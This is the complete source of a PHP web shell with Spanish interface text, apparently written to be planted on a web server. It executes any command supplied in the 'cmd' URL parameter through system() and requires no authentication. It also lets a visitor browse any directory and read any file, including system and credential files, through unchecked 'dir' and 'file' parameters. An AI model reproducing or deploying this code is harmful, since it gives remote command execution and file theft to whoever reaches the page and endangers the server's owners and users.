<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$files = scandir($dir);

function showContent($file) {
    if (is_file($file)) {
        return file_get_contents($file);
    } else {
        return "No se pudo abrir el archivo.";
    }
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $contenido = showContent($file);
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell</title>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f4;
    margin: 0;
    padding: 0;
}

.container {
    max-width: 900px;
    margin: 20px auto;
    background-color: #fff;
    padding: 20px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

h1 {
    text-align: center;
}

.file-browser ul {
    list-style: none;
    padding: 0;
}

.file-browser ul li {
    padding: 10px;
    border-bottom: 1px solid #ddd;
}

.file-browser ul li a {
    text-decoration: none;
    color: #3498db;
}

.file-browser ul li a:hover {
    text-decoration: underline;
}

.breadcrumb {
    margin-bottom: 10px;
}

.breadcrumb a {
    text-decoration: none;
    color: #3498db;
}

.breadcrumb a:hover {
    text-decoration: underline;
}
</style>
</head>
<body>
  <div class="container">
    <h1>Webshell</h1>
    <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <label>Command:</label>
      <input type="text" name="cmd" autofocus id="cmd" size="80">
      <button type="submit">Execute</button>
    </form>
    <pre>
    <?php
      if(isset($_GET['cmd'])){
        system($_GET['cmd']);
      }
    ?>
    </pre>
        <div class="breadcrumb">
            <?php
            $breadcrumbs = explode('/', $dir);
            $path = '';
            foreach ($breadcrumbs as $breadcrumb) {
                $path .= $breadcrumb . '/';
                if ($breadcrumb != '.') {
                    echo '<a href="?dir=' . rtrim($path, '/') . '">' . $breadcrumb . '</a> / ';
                }
            }
            ?>
        </div>
        <?php if (isset($contenido)): ?>
            <div class="file-content">
                <h2>Contenido de <?php echo basename($file); ?></h2>
                <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
                <pre style="overflow:auto;"><?php echo htmlspecialchars($contenido); ?></pre>
                <p><a href="?dir=<?php echo urlencode(dirname($file)); ?>">Back</a></p>
            </div>
        <?php else: ?>
            <div class="file-browser">
                <table width="100%">
                    <tr>
                        <th style="width: 50%;">Name</th>
                        <th style="width: 50%;">Type</th>
                    </tr>
                    <?php if ($dir != '.'): ?>
                        <tr>
                            <td><a href="?dir=<?php echo dirname($dir); ?>">../</a></td>
                            <td>Directory</td>
                        </tr>
                    <?php endif; ?>
                    <?php foreach ($files as $file): ?>
                        <?php if ($file != '.' && $file != '..'): ?>
                            <tr>
                                <td>
                                    <?php if (is_dir($dir . '/' . $file)): ?>
                                        <a href="?dir=<?php echo $dir . '/' . $file; ?>"><?php echo $file; ?></a>
                                    <?php else: ?>
                                        <a href="?file=<?php echo $dir . '/' . $file; ?>"><?php echo $file; ?></a>
                                    <?php endif; ?>
                                </td>
                                <td style="text-align:center">
                                    <?php echo is_dir($dir . '/' . $file) ? 'Directory' : 'File'; ?>
                                </td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </table>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>

